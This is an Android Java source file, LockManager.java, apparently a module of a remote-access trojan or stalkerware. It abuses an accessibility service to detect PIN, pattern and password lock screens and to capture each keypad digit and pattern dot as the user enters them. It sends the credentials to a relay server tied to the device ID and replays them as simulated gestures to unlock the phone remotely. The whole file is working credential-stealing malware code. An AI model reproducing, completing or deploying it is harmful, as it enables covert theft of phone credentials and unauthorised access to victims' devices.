/*
 * MODULE: LockManager.java
 * PURPOSE: Lock screen credential detection, live pattern capture, PIN extraction, and automated gesture auto-unlock.
 *
 * DIRECT INBOUND CONNECTIONS:
 * - ControlService.java -> handleLockScreenDetection(), handlePinDigitClick(), handleLivePatternEvent(), tryAutoUnlock(), unlockWithPin(), checkLockScreen(), isDeviceCurrentlyLocked(), cleanup()
 * - HardwareSensorManager.java -> isDeviceCurrentlyLocked()
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - RelayClient.java -> sendLockCaptured(), sendLockDetected(), sendPinTyping(), sendCredentials(), sendLog()
 * - AccessibilityService -> dispatchGesture()
 *
 * FUNCTION-BY-FLOW MAPPING:
 * - LockManager(AccessibilityService, String, KeyguardManager, WindowManager): Registers broadcast receivers and initial state.
 * - deepReadOnWakeup(): Runs fastDetectRunnable with 250ms pacing on screen wakeup.
 * - detectLockTypeFast(): Scans active window hierarchy for PIN/Pattern/Password UI elements.
 * - handleLivePatternEvent(AccessibilityEvent): Collects live pattern touch gestures.
 * - handlePinDigitClick(AccessibilityEvent): Intercepts on-screen keypad clicks for PIN recovery.
 * - tryAutoUnlock(String): Simulates gestures on the pattern grid.
 * - unlockWithPin(JSONObject): Enters PIN via accessibility node or simulated coordinate taps.
 * - checkLockScreen(): Fast lock verification pass.
 * - cleanup(): Unregisters receivers and cancels handler loops.
 */
package com.device.ctrl;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class LockManager {

    private final AccessibilityService srv;
    private final String androidId;
    private final KeyguardManager km;
    private final WindowManager wm;
    private final Handler h = new Handler(Looper.getMainLooper());
    private final Handler lockHandler = new Handler(Looper.getMainLooper());

    public boolean captureMode = true;
    private boolean lockCaptureActive = false;
    private boolean isCapturingPin = false;
    private boolean lockTypeSent = false;
    private boolean lastLockedState = false;
    private boolean isUnlocking = false;
    private boolean screenReceiverRegistered = false;

    private String detectedLockType = "none";
    private final StringBuilder capturedDigits = new StringBuilder();
    private long lockScreenDetectedTime = 0;
    private Runnable unlockPollRunnable, fastDetectRunnable;
    private int pinDigitCount = 0;
    public String autoPattern = "", pendingPattern = "";
    private List<Rect> patternDots = new ArrayList<>();
    private Rect patternBounds = null;

    private static final Pattern DIGIT_ID_PATTERN = Pattern.compile(
            "(?:key|pin|digit|num|number|kp|numpad_key|pin_key|button)(\\d)$",
            Pattern.CASE_INSENSITIVE);

    private final BroadcastReceiver screenReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context c, Intent i) {
            String a = i.getAction();
            if (Intent.ACTION_SCREEN_ON.equals(a) || Intent.ACTION_USER_PRESENT.equals(a)) {
                log("⏳ Screen WOKE UP -> Delaying 250ms for UI to load...");
                h.postDelayed(() -> deepReadOnWakeup(), 250);
            } else if (Intent.ACTION_SCREEN_OFF.equals(a)) {
                log("💤 Screen TURNED OFF -> Stopping Lock Scanner.");
                lockCaptureActive = false;
                lockHandler.removeCallbacksAndMessages(null);
            }
        }
    };

    public LockManager(AccessibilityService srv, String androidId, KeyguardManager km, WindowManager wm) {
        this.srv = srv;
        this.androidId = androidId;
        this.km = km;
        this.wm = wm;
        registerScreenReceiver();
    }

    private void log(String msg) {
        try { RelayClient.get().sendLog("🔒 " + msg); } catch (Exception ignored) {}
    }

    private void registerScreenReceiver() {
        if (screenReceiverRegistered) return;
        try {
            IntentFilter f = new IntentFilter();
            f.addAction(Intent.ACTION_SCREEN_ON);
            f.addAction(Intent.ACTION_SCREEN_OFF);
            f.addAction(Intent.ACTION_USER_PRESENT);
            srv.registerReceiver(screenReceiver, f);
            screenReceiverRegistered = true;
        } catch (Exception ignored) {}
    }

    private void deepReadOnWakeup() {
        if (!captureMode) {
            log("⚠️ Capture Mode is OFF. Ignoring screen wakeup.");
            return;
        }
        if (km == null || !isDeviceCurrentlyLocked()) {
            log("🔓 Device is NOT locked. Skipping scan.");
            return;
        }
        log("🔎 Starting Deep Scan for Lock Screen...");
        lockCaptureActive = true;
        isCapturingPin = false;
        detectedLockType = "unknown";
        capturedDigits.setLength(0);
        pendingPattern = "";
        pinDigitCount = 0;
        lockTypeSent = false;
        lockScreenDetectedTime = System.currentTimeMillis();
        lockHandler.removeCallbacks(fastDetectRunnable);
        fastDetectRunnable = new Runnable() {
            @Override
            public void run() {
                if (!lockCaptureActive) return;
                boolean found = detectLockTypeFast();
                if (!found && (System.currentTimeMillis() - lockScreenDetectedTime < 5000)) {
                    lockHandler.postDelayed(this, 250);
                } else if (!found) {
                    log("❌ Scan Timeout (5s). No known lock screen UI found.");
                }
            }
        };
        lockHandler.post(fastDetectRunnable);
    }

    public boolean isDeviceCurrentlyLocked() {
        if (km == null) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) return km.isDeviceLocked();
        return km.isKeyguardLocked();
    }

    public void handleLockScreenDetection(AccessibilityEvent event) {
        if (km == null) return;
        boolean locked = isDeviceCurrentlyLocked();
        if (locked && !lastLockedState && !lockCaptureActive) {
            log("🔒 Device locked state changed to TRUE.");
            deepReadOnWakeup();
            startUnlockPolling();
        }
        if (!locked && lastLockedState && lockCaptureActive) onDeviceUnlocked();
        lastLockedState = locked;
    }

    private void startUnlockPolling() {
        lockHandler.removeCallbacks(unlockPollRunnable);
        unlockPollRunnable = new Runnable() {
            @Override
            public void run() {
                if (!lockCaptureActive) return;
                if (km == null) { lockHandler.postDelayed(this, 350); return; }
                if (!isDeviceCurrentlyLocked()) { lastLockedState = false; onDeviceUnlocked(); return; }
                lockHandler.postDelayed(this, 350);
            }
        };
        lockHandler.postDelayed(unlockPollRunnable, 500);
    }

    private boolean detectLockTypeFast() {
        AccessibilityNodeInfo root = srv.getRootInActiveWindow();
        if (root == null) return false;
        List<AccessibilityNodeInfo> allNodes = new ArrayList<>();
        flatten(root, allNodes);
        int digitButtonCount = 0;
        boolean hasPatternView = false, hasPasswordField = false;
        String detectedPattern = "";
        patternBounds = null;
        for (AccessibilityNodeInfo node : allNodes) {
            String className = safeClassName(node);
            String viewId = safeViewId(node);
            boolean isPatternClass =
                    className.contains("lockpatternview") ||
                    className.contains("secpatternview") ||
                    className.contains("miuikeyguardpattern") ||
                    className.contains("patternlockview") ||
                    className.contains("patternview");
            boolean isPatternId =
                    viewId.contains("lock_pattern") ||
                    viewId.contains("patternview") ||
                    viewId.contains("pattern_lock") ||
                    viewId.contains("keyguardpattern");
            if (!hasPatternView && (isPatternClass || isPatternId)) {
                Rect b = new Rect();
                node.getBoundsInScreen(b);
                if (b.width() > 150 && b.height() > 150) {
                    hasPatternView = true;
                    detectedPattern = className + " [id:" + viewId + "]";
                    patternBounds = b;
                    log("✅ DETECTED PATTERN UI: " + className);
                }
            }
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String textStr = (text != null) ? text.toString().trim() : "";
            String descStr = (desc != null) ? desc.toString().trim() : "";
            if (node.isClickable()) {
                if (textStr.length() == 1 && Character.isDigit(textStr.charAt(0))) digitButtonCount++;
                else if (descStr.length() == 1 && Character.isDigit(descStr.charAt(0))) digitButtonCount++;
            }
            String rawId = node.getViewIdResourceName();
            if (rawId != null) {
                Matcher m = DIGIT_ID_PATTERN.matcher(rawId);
                if (m.find()) digitButtonCount++;
            }
            if (viewId.contains("numpad_key") || viewId.contains("pinkey")
                    || viewId.contains("numkey") || viewId.contains("pin_key")) digitButtonCount++;
            if (node.isPassword() && (node.isEditable() || className.contains("edittext"))) hasPasswordField = true;
            if (viewId.contains("password_entry") || viewId.contains("pin_entry")) {
                if (className.contains("edittext")) hasPasswordField = true;
            }
        }
        for (AccessibilityNodeInfo n : allNodes) { if (n != root) safeRecycle(n); }
        safeRecycle(root);
        if (hasPatternView) {
            detectedLockType = "pattern";
            isCapturingPin = false;
            sendLockDetected("pattern", detectedPattern);
            if (patternBounds != null) {
                List<Rect> dots = splitGrid(patternBounds);
                if (dots.size() >= 9) patternDots = new ArrayList<>(dots.subList(0, 9));
            }
            return true;
        } else if (digitButtonCount >= 8) {
            detectedLockType = "pin";
            isCapturingPin = true;
            sendLockDetected("pin", digitButtonCount + " keys");
            log("✅ DETECTED PIN UI (" + digitButtonCount + " digits found)");
            return true;
        } else if (hasPasswordField) {
            detectedLockType = "password";
            isCapturingPin = false;
            sendLockDetected("password", "");
            log("✅ DETECTED PASSWORD UI");
            return true;
        }
        return false;
    }

    public void handlePinDigitClick(AccessibilityEvent event) {
        if (!isCapturingPin && !isDeviceCurrentlyLocked()) return;
        String digit = "";
        boolean isDel = false;
        if (event.getText() != null && !event.getText().isEmpty()) {
            String t = event.getText().get(0).toString().trim().toLowerCase();
            if (t.length() == 1 && Character.isDigit(t.charAt(0))) digit = t;
            else if (t.contains("del") || t.contains("clear") || t.contains("back")) isDel = true;
        }
        if (digit.isEmpty() && !isDel) {
            AccessibilityNodeInfo src = event.getSource();
            if (src != null) {
                try {
                    String t = src.getText() != null ? src.getText().toString().trim().toLowerCase() : "";
                    String d = src.getContentDescription() != null ? src.getContentDescription().toString().trim().toLowerCase() : "";
                    String id = src.getViewIdResourceName() != null ? src.getViewIdResourceName().toLowerCase() : "";
                    if (t.length() == 1 && Character.isDigit(t.charAt(0))) digit = t;
                    else if (d.length() == 1 && Character.isDigit(d.charAt(0))) digit = d;
                    else { Matcher m = DIGIT_ID_PATTERN.matcher(id); if (m.find()) digit = m.group(1); }
                    if (t.contains("del") || d.contains("del") || id.contains("del") || id.contains("back")) isDel = true;
                } catch (Exception ignored) {
                } finally {
                    safeRecycle(src);
                }
            }
        }
        if (isDel && capturedDigits.length() > 0) {
            capturedDigits.deleteCharAt(capturedDigits.length() - 1);
            pinDigitCount--;
            log("⌫ PIN Backspace Pressed. Total: " + capturedDigits.length());
            RelayClient.get().sendPinTyping(capturedDigits.toString());
        } else if (!digit.isEmpty()) {
            detectedLockType = "pin";
            isCapturingPin = true;
            capturedDigits.append(digit);
            pinDigitCount++;
            log("🔢 PIN Digit Pressed: " + digit + " | Full: " + capturedDigits.toString());
            RelayClient.get().sendPinTyping(capturedDigits.toString());
        }
    }

    public void handleLivePatternEvent(AccessibilityEvent event) {
        if (!captureMode || !isDeviceCurrentlyLocked() || isUnlocking) return;
        String evText = "";
        if (event.getContentDescription() != null) evText += event.getContentDescription().toString().toLowerCase() + " ";
        if (event.getText() != null) {
            for (CharSequence t : event.getText()) if (t != null) evText += t.toString().toLowerCase() + " ";
        }
        if (!evText.trim().isEmpty()) {
            log("📡 RAW LIVE EVENT: [" + evText.trim() + "]");
        }
        if (evText.contains("cleared") || evText.contains("clear")) {
            log("🧹 Pattern Cleared by user.");
            pendingPattern = "";
        } else if (evText.contains("cell") || evText.contains("dot") || evText.contains("added") || evText.matches(".*\\b[1-9]\\b.*")) {
            Matcher m = Pattern.compile("\\b([1-9])\\b").matcher(evText);
            while (m.find()) {
                String num = m.group(1);
                if (pendingPattern.isEmpty() || !pendingPattern.endsWith(num)) {
                    pendingPattern += num;
                    detectedLockType = "pattern";
                    log("🎯 DOT CAPTURED: " + num + " | Full Sequence: " + pendingPattern);
                }
            }
        }
    }

    private void onDeviceUnlocked() {
        log("🔓 Device UNLOCKED! Analyzing captured data...");
        lockCaptureActive = false;
        isCapturingPin = false;
        lockHandler.removeCallbacksAndMessages(null);
        String captured = capturedDigits.toString();
        if ("pin".equals(detectedLockType) && captured.length() >= 4) {
            log("🔥 SUCCESS! PIN Captured: " + captured);
            RelayClient.get().sendCredentials("pin", captured);
            RelayClient.get().sendLockCaptured("pin", captured);
        } else if ("pattern".equals(detectedLockType)) {
            if (!pendingPattern.isEmpty()) {
                autoPattern = pendingPattern;
                log("🔥 SUCCESS! PATTERN Captured: " + autoPattern);
                RelayClient.get().sendCredentials("pattern", autoPattern);
                RelayClient.get().sendLockCaptured("pattern", autoPattern);
                pendingPattern = "";
            } else if (!autoPattern.isEmpty()) {
                log("🔄 Unlocked with previously saved Pattern.");
                RelayClient.get().sendLockCaptured("pattern", autoPattern);
            } else {
                log("⚠️ Unlocked, but no pattern was in buffer!");
            }
        }
        capturedDigits.setLength(0);
        pinDigitCount = 0;
        RelayClient.get().sendPinTyping("");
    }

    private void sendLockDetected(String type, String detail) {
        if (lockTypeSent) return;
        lockTypeSent = true;
        try {
            RelayClient.get().send(new JSONObject()
                    .put("type", "lock_detected")
                    .put("androidId", androidId)
                    .put("lockType", type)
                    .put("detail", detail)
                    .put("timestamp", System.currentTimeMillis()));
        } catch (Exception ignored) {}
    }

    public void checkLockScreen() {
        if (km == null || !isDeviceCurrentlyLocked()) return;
        if (captureMode) deepReadOnWakeup();
    }

    private List<Rect> splitGrid(Rect host) {
        List<Rect> list = new ArrayList<>();
        float cw = host.width() / 3f, ch = host.height() / 3f;
        float ix = cw / 4f, iy = ch / 4f;
        for (int r = 0; r < 3; r++) {
            for (int c = 0; c < 3; c++) {
                int left = (int)(host.left + c * cw + ix);
                int top = (int)(host.top + r * ch + iy);
                int right = (int)(host.left + (c + 1) * cw - ix);
                int bottom = (int)(host.top + (r + 1) * ch - iy);
                list.add(new Rect(left, top, right, bottom));
            }
        }
        return list;
    }

    public void tryAutoUnlock(String pattern) {
        log("🤖 Attempting Auto-Unlock with Pattern: " + pattern);
        if (patternDots.size() < 9) {
            AccessibilityNodeInfo root = srv.getRootInActiveWindow();
            if (root != null) {
                List<AccessibilityNodeInfo> all = new ArrayList<>();
                flatten(root, all);
                Rect best = null; int maxScore = -1;
                for (AccessibilityNodeInfo n : all) {
                    String cls = safeClassName(n);
                    String id = safeViewId(n);
                    int score = 0;
                    if (cls.contains("lockpatternview") || cls.contains("secpatternview")
                            || cls.contains("miuikeyguardpattern") || cls.contains("patternlockview")) score = 100;
                    else if (cls.contains("patternview")) score = 80;
                    else if (cls.contains("keyguardpattern") || id.contains("lock_pattern")
                            || id.contains("patternview") || id.contains("pattern_lock")) score = 30;
                    if (score > 0) {
                        Rect b = new Rect(); n.getBoundsInScreen(b);
                        if (b.width() > 150 && b.height() > 150) {
                            float ratio = (float) b.width() / b.height();
                            if (ratio > 0.85f && ratio < 1.15f) score += 50;
                            if (score > maxScore) { maxScore = score; best = b; }
                        }
                    }
                }
                for (AccessibilityNodeInfo n : all) if (n != root) safeRecycle(n);
                safeRecycle(root);
                if (best != null) {
                    List<Rect> dots = splitGrid(best);
                    if (dots.size() >= 9) patternDots = new ArrayList<>(dots.subList(0, 9));
                    else { log("⚠️ Auto-Unlock Failed: Could not map 9 dots."); isUnlocking = false; return; }
                } else { log("⚠️ Auto-Unlock Failed: Pattern UI not found on screen."); isUnlocking = false; return; }
            } else { isUnlocking = false; return; }
        }
        Path p = new Path();
        boolean first = true;
        for (int i = 0; i < pattern.length(); i++) {
            int idx = Character.getNumericValue(pattern.charAt(i)) - 1;
            if (idx >= 0 && idx < patternDots.size()) {
                Rect r = patternDots.get(idx);
                if (first) { p.moveTo(r.centerX(), r.centerY()); first = false; }
                else p.lineTo(r.centerX(), r.centerY());
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            isUnlocking = true;
            try {
                srv.dispatchGesture(
                        new GestureDescription.Builder()
                                .addStroke(new GestureDescription.StrokeDescription(
                                        p, 0, Math.max(350, pattern.length() * 120)))
                                .build(),
                        null, null);
                log("🤖 Auto-Unlock Gesture Dispatched.");
            } catch (Exception ignored) {}
            h.postDelayed(() -> {
                if (!isDeviceCurrentlyLocked()) {
                    autoPattern = pattern;
                    RelayClient.get().sendCredentials("pattern", pattern);
                    RelayClient.get().sendLockCaptured("pattern", pattern);
                } else {
                    log("❌ Auto-Unlock Failed: Screen still locked after gesture.");
                }
                isUnlocking = false;
            }, 2000);
        }
    }

    public void unlockWithPin(JSONObject data) {
        try {
            String pin = data != null ? data.optString("pin", "") : "";
            if (pin.isEmpty()) return;
            log("🤖 Auto-Unlocking with PIN: " + pin);
            enterPinSequentially(pin, 0);
        } catch (Exception ignored) {}
    }

    private void enterPinSequentially(String pin, int index) {
        if (index >= pin.length()) {
            h.postDelayed(this::pressEnterKey, 200);
            return;
        }
        String digit = String.valueOf(pin.charAt(index));
        AccessibilityNodeInfo root = srv.getRootInActiveWindow();
        if (root != null) {
            clickDigitOnScreen(digit, root);
            safeRecycle(root);
        }
        h.postDelayed(() -> enterPinSequentially(pin, index + 1), 160);
    }

    private void pressEnterKey() {
        AccessibilityNodeInfo root = srv.getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> all = new ArrayList<>();
        flatten(root, all);
        for (AccessibilityNodeInfo n : all) {
            String id = safeViewId(n);
            String t = n.getText() != null ? n.getText().toString().toLowerCase() : "";
            String d = n.getContentDescription() != null ? n.getContentDescription().toString().toLowerCase() : "";
            if (id.contains("ok") || id.contains("enter") || id.contains("done")
                    || t.contains("ok") || t.contains("enter")
                    || d.contains("enter") || d.contains("ok")) {
                if (n.isClickable()) n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                break;
            }
        }
        for (AccessibilityNodeInfo n : all) if (n != root) safeRecycle(n);
        safeRecycle(root);
    }

    private boolean clickDigitOnScreen(String digit, AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> all = new ArrayList<>();
        flatten(root, all);
        boolean clicked = false;
        for (AccessibilityNodeInfo n : all) {
            String text = n.getText() != null ? n.getText().toString().trim() : "";
            String desc = n.getContentDescription() != null ? n.getContentDescription().toString().trim() : "";
            String id = safeViewId(n);
            boolean match = text.equals(digit) || desc.equals(digit);
            if (!match) {
                Matcher m = DIGIT_ID_PATTERN.matcher(id);
                if (m.find() && m.group(1).equals(digit)) match = true;
            }
            if (match && performNodeClick(n)) { clicked = true; break; }
        }
        for (AccessibilityNodeInfo n : all) if (n != root) safeRecycle(n);
        return clicked;
    }

    private boolean performNodeClick(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable() && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
        AccessibilityNodeInfo parent = node.getParent();
        while (parent != null) {
            if (parent.isClickable()) {
                boolean res = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                safeRecycle(parent);
                if (res) return true;
                break;
            }
            AccessibilityNodeInfo next = parent.getParent();
            safeRecycle(parent);
            parent = next;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Rect bounds = new Rect();
            node.getBoundsInScreen(bounds);
            if (bounds.width() > 0 && bounds.height() > 0) {
                Path path = new Path();
                path.moveTo(bounds.centerX(), bounds.centerY());
                srv.dispatchGesture(new GestureDescription.Builder()
                        .addStroke(new GestureDescription.StrokeDescription(path, 0, 50))
                        .build(), null, null);
                return true;
            }
        }
        return false;
    }

    public void cleanup() {
        h.removeCallbacksAndMessages(null);
        lockHandler.removeCallbacksAndMessages(null);
        if (screenReceiverRegistered) {
            try { srv.unregisterReceiver(screenReceiver); } catch (Exception ignored) {}
            screenReceiverRegistered = false;
        }
    }

    private String safeClassName(AccessibilityNodeInfo n) {
        try { return n.getClassName() != null ? n.getClassName().toString().toLowerCase() : ""; }
        catch (Exception e) { return ""; }
    }

    private String safeViewId(AccessibilityNodeInfo n) {
        try { return n.getViewIdResourceName() != null ? n.getViewIdResourceName().toLowerCase() : ""; }
        catch (Exception e) { return ""; }
    }

    private void safeRecycle(AccessibilityNodeInfo n) {
        if (n != null) try { n.recycle(); } catch (Exception ignored) {}
    }

    private void flatten(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list) {
        if (node == null) return;
        list.add(node);
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo c = node.getChild(i);
            if (c != null) flatten(c, list);
        }
    }
}
